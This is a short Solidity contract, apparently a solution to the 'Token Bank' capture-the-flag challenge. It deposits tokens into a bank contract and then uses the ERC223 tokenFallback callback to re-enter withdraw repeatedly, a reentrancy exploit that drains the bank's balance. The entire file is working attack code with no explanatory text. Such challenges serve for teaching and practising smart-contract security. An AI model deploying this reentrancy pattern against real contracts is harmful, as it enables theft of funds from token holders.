pragma solidity ^0.4.21;

import "./token_bank.sol";

contract TokenBankSolver {
	uint8 counter = 0;
	TokenBankChallenge challenge;

	function TokenBankSolver(address _addr) public {
		challenge = TokenBankChallenge(_addr);
	}

	function transferToTokenBank(address tokenaddr, address bankaddr) public {
		SimpleERC223Token token = SimpleERC223Token(tokenaddr);
		token.transfer(bankaddr, 500000 * 10 ** 18);
	}

	function exploit() {
		challenge.withdraw(500000 * 10 ** 18);
	}

	function tokenFallback(address from, uint256 value, bytes) public {
		if(counter == 0 || counter == 2) {
			counter += 1;
		} else {
			counter += 1;
			challenge.withdraw(500000 * 10 ** 18);
		}
	}
}
